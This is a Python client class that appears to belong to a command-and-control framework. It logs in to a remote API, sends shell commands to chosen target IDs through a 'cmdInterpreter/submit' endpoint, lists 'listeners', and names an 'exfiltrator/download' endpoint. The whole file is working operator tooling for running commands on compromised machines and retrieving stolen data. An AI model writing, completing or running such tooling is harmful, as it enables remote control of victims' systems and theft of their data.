import requests
import json
import base64
from enum import Enum
from modelmapper import *

class ApiExecCode(Enum):
    Success = 0 
    Fail = 1
    Error = 2
    InvalidID = 3

class HttpClient():

    def __init__(self, api_url) -> None:
        self.api_url = api_url
        self.std_timeout = 20 # all requests timeout after 15s

    def set_timeout(self, timeout):
        self.std_timeout = timeout

    def api_authenticate(self, email, password):

        parameters = [ parameter("email", email), parameter("password", password)]

        try:
            httpResponse = requests.post(url= self.endpointOf("auth"), data=json.dumps(parameters), verify=".\\ssl_certificate\\api_certificate.cer", 
                                         headers={"Content-type": "application/json"}, timeout=self.std_timeout)
            
            
            if(httpResponse.status_code == 200):
                response = httpResponse.json()
                
                success = ApiExecCode(response["code"]) == ApiExecCode.Success
                return success, response["data"]
                
            else:
                print(f"Authentication failed with status {httpResponse.status_code}.")
        
        except requests.Timeout:
            print("Authentication timed out.")

        except Exception as ex:
            print("Unexpected error upon authentication attempt.")

        return False, None

    def api_submit_cmd(self, session_token, target_id, is_shell, command_str):
        cmd = command(session_token, target_id, is_shell, command_str)

        try:

            httpResponse = requests.post(url= self.endpointOf("submit_cmd"), data=json.dumps(cmd), verify=".\\ssl_certificate\\api_certificate.cer", 
                                         headers={"Content-type": "application/json"}, timeout=self.std_timeout)
            
            if httpResponse.status_code == 200:
                cmdResult = httpResponse.json()

                return cmdResult["resultString"]
            else:
                print(f"Command submit failed with status {httpResponse.status_code}.")
        
        except requests.Timeout:
            print("Command timed out.")

        except Exception as ex:
            print("Unexpected error while submitting command.")

        return None
    
    def api_get_listeners(self, session_token):
        token = parameter("sessionId", session_token)

        try:
            httpResponse = requests.post(url= self.endpointOf("listeners"), data= json.dumps(token), verify=".\\ssl_certificate\\api_certificate.cer", 
                                         headers={"Content-type": "application/json"}, timeout=self.std_timeout)

            if httpResponse.status_code == 200:
                response = httpResponse.json()

                return response["data"]
            else:
                print(f"Fetching list of listeners failed with status {httpResponse.status_code}.")

        except requests.Timeout:
            print("Timed out.")

        except Exception as ex:
            print("Unexpected error while fetching listeners.")

        return []

    def endpointOf(self, name):
        api_endpoints = {
            "auth": "/api/accountManager/auth",
            "submit_cmd": "/api/cmdInterpreter/submit",
            "listeners": "/api/cmdInterpreter/listeners",
            "download": "/api/exfiltrator/download"
        }
        
        return f"{self.api_url}{api_endpoints[name]}"
